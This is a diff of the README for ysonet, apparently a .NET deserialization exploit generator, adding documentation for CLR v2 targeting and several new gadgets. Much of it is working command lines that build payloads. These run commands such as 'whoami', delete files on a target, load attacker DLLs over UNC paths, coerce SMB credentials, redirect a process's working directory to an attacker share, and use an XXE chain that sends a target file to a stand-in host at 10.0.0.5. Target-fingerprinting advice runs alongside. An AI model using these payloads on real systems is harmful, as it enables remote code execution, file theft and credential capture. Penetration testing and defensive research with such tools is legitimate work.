@@ -32,7 +32,10 @@ Options:
                                bridge gadget. The last one will be used in the
                                requested gadget. This will be ignored when
                                using the searchformatter argument.
-  -t, --test                 Whether to run payload locally. Default: false
+  -t, --test                 Test locally. With --legacyfx, use the shipped CLR2
+                               process; otherwise use ysonet's current CLR4 process.
+      --testclr2             Explicitly test in the shipped .NET Framework 3.5 /
+                               CLR2 process (BF, LosFormatter, and SoapFormatter).
       --outputpath=VALUE     The output file path. It will be ignored if
                                empty.
       --minify               Whether to minify the payloads where applicable.
@@ -41,12 +44,21 @@ Options:
                                minifying and FormatterAssemblyStyle=Simple
                                (always `true` with `--minify` for binary
                                formatters). Default: true
+      --legacyfx             Target the .NET Framework 2.0/3.0/3.5 (CLR v2)
+                               generation. The shared transform rewrites
+                               framework assembly versions; gadgets that carry
+                               source may also use the CLR-v2 compiler, and a
+                               gadget may author a type's older assembly identity
+                               when it moved between CLR generations. The graph
+                               and your input are untouched. It is not proof that
+                               every gadget works there. Default: false
       --raf, --runallformatters
                              Try every listed non denial-of-service gadget
                                whose formatter name contains the given text.
                                Requires -f plus -c or -s, and cannot be
                                combined with -g or -p. Uses each formatter's
-                               default output format, ignores -o and -t, prints
+                               default output format, ignores -o, -t, and
+                               --testclr2, prints
                                payloads with their length, and reports per-
                                payload failures plus a summary on stderr.
                                Default: false
@@ -127,7 +139,8 @@ axis:
 - the .NET version the target application was BUILT AGAINST, when the gate is a
   compile-time compatibility switch.
 
-`DataViewManagerXxe` and `DataSetXxe` are the second kind, and it is worth
+`DataViewManagerXxe`, `DataSetXxe`, `XmlDocumentXxe` variant 1 and
+`XmlDocumentSurrogateXxe` are the second kind, and it is worth
 knowing because it surprises people: they list 4.0 - 4.5.1 because
 `XmlReaderSettings.EnableLegacyXmlSettings()` reads the target application's own
 `TargetFrameworkAttribute`. A fully patched Windows box with .NET 4.8.1 runs
@@ -136,6 +149,9 @@ those payloads all day if the app hosting the deserializer was compiled against
 Installing or removing framework versions on the target changes nothing. It also
 means `ysonet.exe -t` cannot fire them: this tool targets 4.7.2, so its own XML
 reader gets a null resolver, which is why it prints a note saying so.
+`XmlDocumentXxe` variant 2 is the counter-example worth knowing: it assigns the
+document its OWN `XmlUrlResolver`, so that switch is never consulted, it declares
+4.0 - 4.8.1, and `-t` really does fetch.
 
 Read a listed version as "reproduced or documented here", never as "fails
 everywhere else". A version that is not listed only means nobody recorded it.
@@ -234,7 +250,8 @@ Skipped 1 denial-of-service gadget. Run it by name with --i-understand-dos.
 ```
 
 The same flag works for a gadget named in a `--bgc` chain, and for the plugins that
-let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`).
+let you pick an inner gadget (`ViewState`, `Resx`, `SharePoint`, `Altserialization`,
+`ApplicationTrust`, `TransactionManagerReenlist`).
 
 ### `WSManPluginInstance`
 
@@ -286,6 +303,209 @@ collection, and the child is the one that dies:
 
 That really does kill a process on your machine, so keep it for a host you are happy to
 experiment on.
+
+## Target the CLR v2 generation (`--legacyfx`)
+
+A payload names the assemblies it needs, and ysonet writes the .NET Framework 4.x
+identities by default: `System, Version=4.0.0.0, ...`. The strict readers -
+`SoapFormatter`, `NetDataContractSerializer`, `DataContractSerializer`,
+`XmlSerializer`'s root envelope, `JavaScriptSerializer` - bind that identity exactly as
+written, so on a .NET Framework 2.0, 3.0 or 3.5 target they refuse the payload before
+the chain is reached, even though a perfectly good 2.0 `System.dll` is sitting right
+there. (`BinaryFormatter` and `LosFormatter` are the exception: their binder unifies
+the identity, which is why many of their payloads already land unchanged.)
+
+`--legacyfx` rewrites those identities to the CLR v2 generation's versions.
+
+```bash
+# Refused on a .NET 2.0-3.5 target: the SOAP namespace URI names System 4.0.0.0
+./ysonet.exe -g TempFileCollection -f SoapFormatter -c "C:\inetpub\wwwroot\robots.txt"
+
+# Accepted there: the same payload, naming System 2.0.0.0
+./ysonet.exe -g TempFileCollection -f SoapFormatter -c "C:\inetpub\wwwroot\robots.txt" --legacyfx
+```
+
+`TypeConfuseDelegateLegacyWorkflow` is the purpose-built command chain for the CLR-v2
+generation. It applies the legacy identities itself, so an explicit `--legacyfx` is
+redundant. In the interactive editor the setting is therefore shown as `on (fixed)` and
+cannot be switched off:
+
+```bash
+./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f BinaryFormatter -c "whoami"
+
+# Direct SOAP: the external root remains List<object>, not an outer surrogate carrier
+./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f SoapFormatter -c "whoami"
+
+# "test locally" automatically selects the shipped CLR2 victim for this gadget
+./ysonet.exe -g TypeConfuseDelegateLegacyWorkflow -f SoapFormatter -c "calc.exe" --test
+```
+
+Its raw and minified BinaryFormatter, SoapFormatter and LosFormatter forms are measured
+executing on .NET Framework 3.5 / CLR 2.0.50727. The SOAP form is a direct document whose
+external root is `List<object>` and whose nested trigger is `TreeSet<string>`; Workflow's
+`ObjectSerializedRef` reconstructs only the internal comparer. It does not use an outer
+`AxHost.State`/DataSet carrier or a nested BinaryFormatter stream. The target also needs
+System.Core 3.5 and System.Workflow.ComponentModel. It does not advertise
+NetDataContractSerializer (the CLR-2 reader requires a missing `memberDatas` element), and
+it does not target CLR 4: a 4.8.1 read rejects the reconstruction with `ArgumentException`
+before the command. Depending on the fixup path, the measured message names unequal
+`members`/`data` lengths or `context`.
+
+For a CLR4 target, use the normal `TypeConfuseDelegate`. Its direct SoapFormatter form is
+available on variants 1 (`SortedSet<string>`) and 3 (`TreeSet<string>`):
+
+```bash
+./ysonet.exe -g TypeConfuseDelegate -f SoapFormatter -c "whoami"
+./ysonet.exe -g TypeConfuseDelegate -f SoapFormatter --variant 3 -c "whoami"
+```
+
+The SOAP root remains the selected native CLR4 container and the nested comparer is the
+native `ComparisonComparer<string>`. It does not wrap the payload in Workflow or another
+surrogate carrier. Variant 2 (`SortedDictionary`) is not offered for SOAP because its
+serialized backing tree is a separate, deeper generic graph; it remains available on
+BinaryFormatter, LosFormatter and NetDataContractSerializer. All normal TCD variants need
+.NET Framework 4.5 or later: .NET 4.0 has neither `Comparer<T>.Create` nor the serializable
+`ComparisonComparer<T>` that this graph places on the wire. This is a real graph boundary,
+not merely the version the tool was compiled against; use the separate legacy Workflow
+gadget for the CLR-v2 generation. Consequently the normal TCD does not offer `legacyfx`
+in interactive mode, and a scripted `--legacyfx` is refused rather than producing a payload
+that cannot run on CLR2. The same rule applies to `TypeConfuseDelegateFileOperations` and
+the Mono-specific TCD.
+
+Choosing between the two: `TypeConfuseDelegate` covers .NET Framework 4.5 through 4.8.1, and
+`TypeConfuseDelegateNet40Workflow` is only for a target whose INSTALLED framework is
+genuinely .NET Framework 4.0 (4.5+ never installed). This is decided by the installed
+framework, NOT by the app pool or the app's target:
+
+- An IIS app pool set to "v4.0" is CLR 4, not .NET 4.0. The pool dropdown chooses the CLR
+  major version (v2.0 vs v4.0); there is no "4.5 pool". On a server with 4.5-4.8 installed,
+  a "v4.0" pool runs 4.8, so use `TypeConfuseDelegate`.
+- `<httpRuntime targetFramework="4.0"/>` in web.config only sets compatibility quirks; it
+  does not restore 4.0's private type shapes. Still `TypeConfuseDelegate`.
+- Use `TypeConfuseDelegateNet40Workflow` only on a real 4.0 install: an old Windows (for
+  example Server 2008 R2 / Windows 7) that never got the 4.5+ update, or an isolated 4.0 VM.
+- Quick check on the target: if `HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full`
+  has a `Release` value, it is 4.5+ (use `TypeConfuseDelegate`); if that value is absent it
+  is genuine 4.0. `ysonet.Net40TestHost.exe --probe` reports `shape=netfx40` only on real 4.0.
+
+For a genuine .NET Framework 4.0 target, use the target-specific Workflow form:
+
+    ./ysonet.exe -g TypeConfuseDelegateNet40Workflow -f BinaryFormatter -c "whoami"
+    ./ysonet.exe -g TypeConfuseDelegateNet40Workflow -f SoapFormatter -c "whoami"
+
+It reconstructs .NET 4.0's two-field Array.FunctorComparer<string> through
+ObjectSerializedRef, then triggers it from SortedSet<string>. BinaryFormatter,
+SoapFormatter and LosFormatter are available; NetDataContractSerializer is not.
+The target needs System.Workflow.ComponentModel. This graph is not compatible with
+later CLR 4 builds, which removed the comparer's c field, so --test is refused in
+ysonet's 4.7.2+ process. `legacyfx` is not offered in interactive mode, and a scripted
+`--legacyfx` is refused because the payload requires CLR4 assembly identities.
+
+Validate the effect on a target whose INSTALLED framework is genuinely .NET Framework 4.0.
+.NET 4.5+ replaces 4.0 in place, so a 4.5-4.8 machine cannot fire it even when the app
+targets 4.0 (an IIS pool showing "v4.0.30319" is CLR 4, not .NET 4.0). Use a Windows image
+with 4.0 and no 4.5+ update, or an isolated 4.0 VM. Confirm the target with
+`ysonet.Net40TestHost.exe --probe` (it prints `shape=netfx40` only on a real 4.0 runtime),
+then fire one payload with its `--deserialize` mode. The repository's opt-in
+`ysonet.Tests.exe --net40` tier automates this through an isolated VM and a mapped directory;
+see `tools/net40-test-host/README.md` for both the manual steps and the tier setup.
+
+Release archives include `ysonet.Clr2TestHost.exe` and its CLR2-only runtime config. The
+host is a deliberately vulnerable, one-shot local process: it verifies that it is really
+running on CLR `2.0.50727` before opening the generated payload, deserializes once, reports
+the observation, and exits. Windows must have the optional .NET Framework 3.5 feature
+installed. `--testclr2` selects this process explicitly; the interactive "test locally"
+setting and `--test --legacyfx` select it automatically. The shipped host reads only
+BinaryFormatter, LosFormatter, and SoapFormatter payloads.
+
+What it does and does not do:
+
+- **The shared identity transform moves only the `Version=` field.** The assembly name,
+  culture, public key token, every type name, the object graph, and your `-c` input are
+  untouched by that transform. The public key
+  token is the same in every framework generation, so the version is the only thing
+  that has to change. Each version is the one that generation really shipped:
+  `mscorlib`/`System`/`System.Web`/`System.Windows.Forms` go to 2.0.0.0, the WPF and WCF
+  assemblies to 3.0.0.0, `System.Core` and `System.Web.Extensions` to 3.5.0.0, and
+  `Microsoft.VisualBasic` to 8.0.0.0 (it is versioned off the Visual Basic product
+  number, not the framework one).
+- **It is a transform, not a compatibility claim.** It cannot make a CLR-4-only carrier,
+  formatter or bundled serializer run on CLR 2, and a rewritten payload is not evidence
+  that the gadget works there. The measured example: `TypeConfuseDelegate` is refused on
+  a 4.x identity, and once `--legacyfx` fixes that the reader gets further and refuses
+  `System.Func\`3`, which mscorlib 2.0 does not have. The identity was never the whole
+  story.
+- **It reaches every layer.** A bridged chain (`--bgc`) and a gadget with a hard-coded
+  inner gadget both rewrite each layer in its own format before the next one wraps it.
+- **`-t` runs the rewritten bytes**, so a self-test tests exactly what you are handed.
+  Normal payloads run in ysonet's current CLR4 process. A `--legacyfx` payload, and a
+  CLR2-only gadget such as `TypeConfuseDelegateLegacyWorkflow`, runs in the shipped CLR2
+  process instead. The child proves `Environment.Version` before it reads the payload.
+- **It refuses rather than guessing.** If your `-c` input itself contains a framework
+  assembly identity, the two are indistinguishable in the finished payload, so the run
+  fails with a message instead of silently editing your data. It also refuses when the
+  payload names a framework assembly that has no CLR v2 build at all - `System.Xaml`,
+  `System.ComponentModel.Composition`, `System.Activities.Presentation`,
+  `System.Numerics` and friends - because a gadget carried by one of those is 4.x only by
+  construction, and rewriting the versions around it would produce a payload that cannot
+  bind while looking as if it had been converted.
+- **`DataContractJsonSerializer` is a no-op.** That format writes no root type into the
+  document, so there is nothing to rewrite; the CLR v2 root type has to come from
+  whatever reads the payload.
+- **A compiled assembly inside a payload is not rewritten.** For the
+  `ActivitySurrogateSelector` family, `--legacyfx` instead compiles the bundled or supplied
+  C# source with the v3.5 compiler and records `Func<>` delegates against `System.Core`
+  3.5, where that type lives on CLR 2. A caller-supplied DLL is still used byte-for-byte.
+  The source-file command shape is
+  `-c "MyClass.cs;UsedRef.dll,Ref2.dll"`; the first semicolon starts the reference list
+  and commas separate multiple references. The default variant and DataSet variant 3 are
+  measured firing on .NET Framework 3.5; `System.Core` 3.5 is their floor. The older,
+  shorter variant 2 remains 4.x-only.
+
+Which gadgets actually FIRE on CLR 2, with or without the option, is measured against a
+real 2.0.50727 child rather than assumed - see the `--legacy` test tier and each
+gadget's runtime version facet.
+
+### `--legacyfx` on a plugin
+
+Five plugins accept `--legacyfx` as their own option: `ViewState`, `Resx`,
+`Altserialization`, `ApplicationTrust` and `TransactionManagerReenlist`. Each one wraps an
+in-box .NET 2.0 API (`SessionStateItemCollection.Deserialize`,
+`HttpStaticObjectsCollection.Deserialize`, `ApplicationTrust.FromXml`,
+`TransactionManager.Reenlist`, `ResXResourceReader`, and page-owned
+`ObjectStateFormatter` with the complete signed ViewState), so the carrier was never what
+kept them off a CLR v2 target - the gadget they wrap was. The ViewState evidence includes
+the page path, page type, `ViewStateUserKey`, matching MachineKey and MAC validation; it is
+not a parameterless LosFormatter read of the object-state prefix.
+
+**It reaches the GADGET, not the plugin's own envelope.** That distinction matters. Four
+of these plugins write an envelope that names no framework assembly at all, so there is
+nothing to rewrite. `Resx` is the exception: its `.resx` resheader and assembly alias name
+`System.Windows.Forms, Version=4.0.0.0`, and `--legacyfx` does NOT rewrite them. That turns
+out not to matter, and it was measured rather than assumed: a CLR v2 `ResXResourceReader`
+ACCEPTS such a document, loads `System.Windows.Forms 2.0.0.0` and fires. Those resheaders
+are descriptive metadata, not a binding the reader enforces.
+
+**All five are measured, not argued.** Each one executes code on a real CLR 2.0.50727 child
+on the 2.0, 3.0 and 3.5 lanes, raw and minified, and the children load only 2.0/3.0
+assemblies. That is what `IPlugin.RuntimeVersions()` records for them, and it is earned by
+the `--legacy` test tier the same way a gadget's floor is.
+
+Pair it with `-g`, which the same five plugins accept, to choose a gadget that can exist on
+the target. The default gadget for most of them is `TextFormattingRunProperties`, which
+needs a PowerShell assembly a CLR v2 target does not have:
+
+```
+./ysonet.exe -p ApplicationTrust -g TempFileCollection -c "C:\path\to\delete.txt" --legacyfx
+./ysonet.exe -p ViewState -g ActivitySurrogateSelector --var 3 --legacyfx --islegacy \
+    --vsg AAAAAAAA --vk <validationkey> --va SHA1 -c placeholder
+```
+
+The second one is the interesting shape: `--var 3` selects `ActivitySurrogateSelector`'s
+`DataSet` carrier instead of the default `AxHost.State`, which is the carrier measured to
+unpack on CLR 2, and `--islegacy` selects the pre-4.5 ViewState signing algorithm. The
+result names no 4.x assembly anywhere. Note that any option a plugin does not recognise -
+`--var` here - is passed through to the gadget you chose with `-g`.
 
 ## Private gadgets and plugins (`--display-private`)
 
@@ -379,6 +599,10 @@ for the other TypeConfuseDelegate payloads.
 
 # 5 empty: create the file, or truncate it if it exists
 ./ysonet.exe -g TypeConfuseDelegateFileOperations -f BinaryFormatter --variant 5 -c "C:\work\empty.txt"
+
+# Direct SOAP is available with the native SortedSet (1) and TreeSet (3) roots
+./ysonet.exe -g TypeConfuseDelegateFileOperations -f SoapFormatter --rootcontainer 3 \
+    --variant 2 -c "C:\work\z-source.txt;C:\work\a-destination.txt"
 ```
 
 Two things to know:
@@ -389,9 +613,16 @@ Two things to know:
   first argument must sort strictly after the second using `String.CompareOrdinal`
   (the target path above the embedded text; the source path above the
   destination). ysonet refuses any other input instead of quietly swapping or
-  rewriting what you typed. The second example is named so the source sorts
-  higher; the first one only passes if the text in `payload.aspx` starts below
-  the target path.
+rewriting what you typed. The second example is named so the source sorts
+higher; the first one only passes if the text in `payload.aspx` starts below
+the target path.
+- SoapFormatter directly authors rootcontainer 1 and 3 and exposes the native CLR4
+  container and `ComparisonComparer<string>` to the target. It uses no Workflow surrogate
+  or outer carrier. Rootcontainer 2 is a deeper generic graph and is refused on SOAP.
+- The `(5)` formatter annotation counts the five file-operation variants, not root
+  choices. SoapFormatter supports all five operations with roots 1 and 3. BinaryFormatter,
+  NetDataContractSerializer and LosFormatter support all five operations with all three
+  roots.
 
 For variant 1 only, the second field is a file on YOUR machine. Its text is read
 and embedded when the payload is built, so it does not need to exist on the
@@ -529,7 +760,9 @@ Three things to know:
 
 `--variant` works exactly as it does on `DataTable`: 1 (default) is the
 `TextFormattingRunProperties` inner, 2 is the built-in `TypeConfuseDelegate` inner,
-which drops SoapFormatter because it is generic.
+and both work with SoapFormatter. For variant 2 the SOAP table is authored together with
+the native CLR4 `SortedSet<string>` / `ComparisonComparer<string>` inner; no generation
+alias survives into the returned document.
 
 ### Delete files on the target when the object is disposed or collected
 
@@ -538,8 +771,8 @@ cleanup path calls `File.Delete` on every path it was given. `-c` is the first
 path, and `--extrafile` adds more - repeat it once per extra path.
 
 ```bash
-# one file
-./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\inetpub\wwwroot\web.config"
+# one file (a benign, easily recreated file - TempFileCollection DELETES it)
+./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\inetpub\wwwroot\robots.txt"
 
 # several files, one --extrafile each
 ./ysonet.exe -g TempFileCollection -f BinaryFormatter -c "C:\app\a.log" --extrafile "C:\app\b.log" --extrafile "C:\app\c.log"
@@ -1071,6 +1304,168 @@ What to expect from variant 2:
   forgotten `--variant 2` is an error rather than a payload that discloses
   nothing.
 
+### Reach the same XML gate through XmlDocument, and lift the version gate
+
+`XmlDocumentXxe` is the shortest carrier in this family. `System.Xml.XmlDocument.InnerXml`
+has a setter that is literally `set { LoadXml(value); }`, so assigning one string parses
+it - and `LoadXml` builds the same legacy `XmlTextReader` as the two gadgets above. The
+carrier needs only `System.Xml`, which every target has.
+
+Variant 1 is the familiar one: set `InnerXml` and let the target's own reader default
+decide.
+
+```bash
+./ysonet.exe -g XmlDocumentXxe -f Xaml                  -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f JavaScriptSerializer  -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f FastJson              -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f YamlDotNet            -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f SharpSerializerXml    -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f SharpSerializerBinary -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentXxe -f MessagePackTypeless   -c "http://10.0.0.5:8080/x.dtd"
+```
+
+Variant 2 is the reason to reach for this gadget over the other two. It assigns a real
+`System.Xml.XmlUrlResolver` to `XmlDocument.XmlResolver` BEFORE `InnerXml`. A document
+that has been given a resolver uses THAT one, so the 4.5.2 hardening never gets a say
+and the payload fires against a current application on a current runtime.
+
+```bash
+./ysonet.exe -g XmlDocumentXxe -f Xaml --variant 2 -c "http://10.0.0.5:8080/x.dtd"
+```
+
+Five things to know:
+
+- VARIANT 2 HAS NO VERSION GATE. That is the whole point of it, and it is why this gadget
+  declares 4.0 - 4.5.1 for variant 1 and 4.0 - 4.8.1 for variant 2. Unlike the other two
+  XXE gadgets, `ysonet.exe -t` really does fetch on variant 2, from your own machine.
+- THE ORDER IS THE PAYLOAD. The resolver has to be assigned before `InnerXml`, or the
+  parse happens before it exists. ysonet always emits it that way; if you hand-edit a
+  payload, keep the order.
+- Variant 2 costs two formatters, and both were measured rather than assumed. FastJson
+  cannot fill the nested `XmlResolver` member at all, and YamlDotNet inspects types
+  through a readable-properties inspector while `XmlDocument.XmlResolver` is write-only.
+  Both pairs are refused with a message that says so, rather than emitted as a payload
+  that would deserialize and do nothing.
+- The gadget-wide list is short for structural reasons. `XmlDocument` is not
+  `[Serializable]`, so BinaryFormatter, SoapFormatter, LosFormatter and FsPickler are out;
+  and `XmlNode` implements `IEnumerable`, so Json.NET builds an ARRAY contract and the
+  DataContract family plus XmlSerializer build a collection contract. Compared with
+  `DataViewManagerXxe`, this carrier implements only `IEnumerable` rather than `IList`,
+  which is what wins back YamlDotNet and the two MessagePack flavours.
+- On the two MessagePack formatters, the target's own library matters:
+  MessagePack-CSharp before 2.3.75 calls EVERY setter on a type it builds, and
+  `XmlNode.Value` throws whatever it is given, so the read dies before the parse. That is
+  a limit of the target, not of the payload.
+
+### Reach the same XML gate with no property setter at all
+
+`XmlDocumentSurrogateXxe` gets to the very same `InnerXml` setter without the payload ever
+naming a property. `System.Workflow.ComponentModel.Serialization.XmlDocumentSurrogate`
+contains a private nested `XmlDocumentReference` class that is `[Serializable]` and
+implements `IObjectReference`, with one private `string innerXml` field. A formatter
+restores that field and then calls `GetRealObject`, which does
+`new XmlDocument()` and `xmlDocument.InnerXml = innerXml`.
+
+You do NOT have to get a surrogate selector registered on the target. Only the type name
+has to resolve, and it does - private nested types are found by name like any other.
+
+```bash
+./ysonet.exe -g XmlDocumentSurrogateXxe -f BinaryFormatter            -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f SoapFormatter              -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f LosFormatter               -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f NetDataContractSerializer  -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f DataContractSerializer     -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f DataContractJsonSerializer -c "http://10.0.0.5:8080/x.dtd"
+./ysonet.exe -g XmlDocumentSurrogateXxe -f FsPickler                  -c "http://10.0.0.5:8080/x.dtd"
+```
+
+Variant 2 goes further and reads a file off the target, exactly the way `DataSetXxe`
+variant 2 does. It needs a host you control and produces TWO artifacts: the payload, and a
+DTD you have to publish. `-c` is the BASE URL of your host, `--file` is what to read on the
+target, and `--dtd-out` is where ysonet writes the DTD for you.
+
+```bash
+./ysonet.exe -g XmlDocumentSurrogateXxe -f BinaryFormatter --variant 2   -c "http://10.0.0.5:8080/"   --file "file:///C:/Windows/system.ini"   --dtd-out ./xmldocsurrogate-oob.dtd   -o base64
+```
+
+Publish it at `http://10.0.0.5:8080/xmldocsurrogate-oob.dtd` and watch
+`http://10.0.0.5:8080/collect`. Everything the `DataSetXxe` variant 2 notes say about what
+comes back applies here unchanged, including that any of `&`, `%`, `'` or `#` anywhere in
+the file breaks the chain and you get no second request at all. The companion file has its
+OWN name, so you can host both gadgets' DTDs on one server without either overwriting the
+other.
+
+Five things to know:
+
+- The target needs `System.Workflow.ComponentModel` - the same assembly the
+  `ActivitySurrogate*` gadgets need. A target that accepts those accepts this.
+- It is legacy-gated and CANNOT lift that gate. `GetRealObject` builds a fresh
+  `XmlDocument` and never assigns a resolver, so there is nowhere to put one; if you need
+  a payload for a modern target, use `XmlDocumentXxe --variant 2`.
+- The formatter list is the OPPOSITE family to the two setter gadgets, which is the reason
+  this gadget exists. It needs a serializer that restores a `[Serializable]` type's fields
+  AND performs the `IObjectReference` fixup - two independent conditions. Json.NET,
+  JavaScriptSerializer and SharpSerializerXml deliver the field perfectly and never run
+  the fixup, so they would deserialize cleanly and do nothing; they are not advertised.
+- FsPickler is advertised, and it behaves differently on purpose. It runs the fixup - the
+  `XmlDocument` really is built, so the fetch really happens - and then throws
+  `InvalidCastException` casting the result back to the declared type. For this gadget
+  that costs nothing, because the whole effect completes inside `GetRealObject`.
+- Variant 1 refuses `--file` and `--dtd-out` instead of ignoring them, so a forgotten
+  `--variant 2` is an error rather than a payload that discloses nothing.
+
+### Make the target load an assembly from a path you name
+
+`AssemblyCatalogLoad` turns one string into a loaded assembly through a PUBLIC
+constructor. `System.ComponentModel.Composition.Hosting.AssemblyCatalog(string codeBase)`
+is MEF, in the .NET Framework GAC since 4.0, so the target needs no application reference.
+Its constructor calls `AssemblyName.GetAssemblyName(codeBase)`, which OPENS the path, and
+then `Assembly.Load` on the identity it read - and because `GetAssemblyName` also fills in
+`AssemblyName.CodeBase`, the loader falls back to your path when normal probing has no such
+assembly. One string, two effects:
+
+- a UNC value starts an SMB session (Windows sends authentication material with it, and
+  nothing has to exist on the share); and
+- a reachable assembly is loaded into the target's default load context.
+
+Only XAML can build it, because the constructor argument is the only way in and
+`x:Arguments` is the only thing in this catalogue that passes one.
+
+```bash
+# a path the target can already open
+./ysonet.exe -g AssemblyCatalogLoad -f Xaml -c "C:\programdata\payload.dll"
+
+# a UNC path: the target opens it over SMB (credential coercion, or a remote load)
+./ysonet.exe -g AssemblyCatalogLoad -f Xaml -c "\\10.0.0.5\share\payload.dll"
+```
+
+Things to know:
+
+- THE LOAD ALONE RUNS NO CODE. A bare `Assembly.Load` does not run a module initializer,
+  and the catalog only STORES the assembly - it does not enumerate its types. Execution
+  needs one more step that belongs to the target: it touches the catalog (enumerating its
+  parts builds a `TypeCatalog` and honours the assembly's own `[CatalogReflectionContext]`
+  attribute), it resolves a type from the loaded assembly by name, or the assembly is mixed
+  mode and its native `DllMain` runs at load. If you need code to run on the load itself,
+  `AssemblyInstallerLoad` (below) is the stronger gadget where its requirements are met.
+- `-t` IS A SELF-EXPLOIT and is accepted: it deserializes the payload in the ysonet
+  process, which loads your assembly HERE (and a .NET assembly cannot be unloaded from an
+  AppDomain). Only `-t` a path you trust.
+- `-c` is taken as typed. There is no extension, path-shape or UNC check: what the value
+  means is the TARGET's decision, and ysonet never opens it while building. A `.dll`, a
+  managed `.exe`, a local path and a UNC path are all valid.
+- UNC delivery is configuration dependent, the same way `AssemblyInstallerLoad`'s is: the
+  SMB session and any authentication callback happen regardless, but LOADING an assembly
+  from a share needs the target to classify it as Local Intranet (a bare IP is Internet
+  zone and needs `loadFromRemoteSources=true`). A DNS or SMB callback proves the target
+  TRIED to open the path, not that it loaded the assembly.
+- If `--minify` would trim your path (it strips leading and trailing whitespace off the
+  argument text), generation is refused rather than shipping a payload that names a
+  different file. A carriage return is refused with or without `--minify`, because XML
+  normalizes it away on every parser. A tab, a repeated interior space and a `"; "`
+  sequence all survive here, because the value travels in element text rather than an
+  attribute.
+
 ### Make the target load your own installer DLL and run it
 
 `AssemblyInstallerLoad` is a bring-your-own-DLL gadget. Setting
@@ -1111,6 +1506,9 @@ public class Boom : Installer
 
 # a different getter carrier (Json.NET and Xaml only)
 ./ysonet.exe -g AssemblyInstallerLoad -f Xaml --getter 3 -c "C:\programdata\installer.dll"
+
+# the BindingSource carrier: no WinForms control is built, so it suits a headless target
+./ysonet.exe -g AssemblyInstallerLoad -f FastJson --getter 5 -c "C:\programdata\installer.dll"
 ```
 
 Things to know:
@@ -1131,9 +1529,23 @@ Things to know:
   The target must also be able to reach the share at all: SMB egress, share
   permissions, and Mark-of-the-Web all apply. A DNS or SMB callback proves the target
   TRIED, not that it loaded the assembly.
-- `--getter` picks the WinForms carrier that reads `HelpText`. Only Json.NET and Xaml
-  can build the ComboBox, ListBox and CheckedListBox carriers, because those expose
-  `Items` without a setter; every other formatter uses `--getter 1` (PropertyGrid).
+- `--getter` picks the carrier that reads `HelpText`, and the five carriers do NOT all
+  work on the same formatters:
+  - `--getter 1` (PropertyGrid) works everywhere and is the default.
+  - `--getter 2` (ComboBox), `3` (ListBox) and `4` (CheckedListBox) need a formatter that
+    can add to a read-only `Items` collection, which is Json.NET and Xaml only.
+  - `--getter 5` (BindingSource) is the opposite: it needs a formatter that will call the
+    `DataMember` and `DataSource` setters, so it works with Xaml, FastJson,
+    JavaScriptSerializer and both SharpSerializer flavours, and is REFUSED on Json.NET,
+    YamlDotNet and both MessagePack flavours. Those four see that `BindingSource`
+    implements `IList` and populate it with `Add` instead of calling the setters, so the
+    payload would deserialize cleanly and do nothing.
+
+  BindingSource is worth knowing about because it is the only carrier that is not a
+  WinForms CONTROL - it is a `Component` with no window - so it suits a headless web or
+  service process. It is also the only alternative to PropertyGrid on FastJson,
+  JavaScriptSerializer and the two SharpSerializer flavours.
+
   ComboBox reads `HelpText` more than once, but your installer is still constructed
   only once: `AssemblyInstaller` sets a private `initialized` flag after the first read.
 - Not the same gadget as `XamlAssemblyLoadFromFile`, which takes C# SOURCE, compiles it
@@ -1142,6 +1554,49 @@ Things to know:
 - If `--minify` would rewrite your path (the YAML minifier collapses repeated spaces,
   the XML one collapses `"; "`), generation is refused rather than shipping a payload
   that names a different file. Drop `--minify` or use a simpler path.
+
+### Move the target process's working directory
+
+`FileSystemProxyCurrentDirectory` sets
+`Microsoft.VisualBasic.MyServices.FileSystemProxy.CurrentDirectory`, whose one-line body
+is `Directory.SetCurrentDirectory(value)`. Deserializing the payload moves the TARGET
+process's working directory - every thread, for the rest of the process's life. This is
+NOT code execution on its own. Its value is what the target does with a relative path
+afterwards: a bare-name native `LoadLibrary` or a relative `Assembly.LoadFrom` resolves
+against the working directory, a relative file read returns whatever you put there, and a
+relative write lands where you chose. It is the in-box equivalent of the xunit
+`PreserveWorkingFolder` gadget, needing no third-party assembly.
+
+```bash
+# point the target at a share you control, so a later bare-name library load pulls your DLL
+./ysonet.exe -g FileSystemProxyCurrentDirectory -f Json.NET -c "\\10.0.0.5\share"
+
+# a local directory works too
+./ysonet.exe -g FileSystemProxyCurrentDirectory -f NetDataContractSerializer -c "C:\programdata\attacker"
+./ysonet.exe -g FileSystemProxyCurrentDirectory -f DataContractSerializer -c "C:\programdata\attacker"
+./ysonet.exe -g FileSystemProxyCurrentDirectory -f DataContractJsonSerializer -c "C:\programdata\attacker"
+./ysonet.exe -g FileSystemProxyCurrentDirectory -f MessagePackTypeless -c "C:\programdata\attacker"
+```
+
+Things to know:
+
+- Only these six formatters are advertised, and the reason is the type's constructor:
+  `FileSystemProxy` is public but its only constructor is `internal`, with no
+  parameterized one. Json.NET builds it in its DEFAULT configuration (it falls back to a
+  non-public default constructor when there is no parameterized creator), the DataContract
+  family builds a plain POCO with no constructor call, and MessagePack constructs the
+  shape. Everything that insists on a PUBLIC parameterless constructor
+  (JavaScriptSerializer, FastJson, YamlDotNet, Xaml, both SharpSerializer flavours) is out,
+  and so are the `[Serializable]`-only formatters (BinaryFormatter, SoapFormatter,
+  LosFormatter, FsPickler).
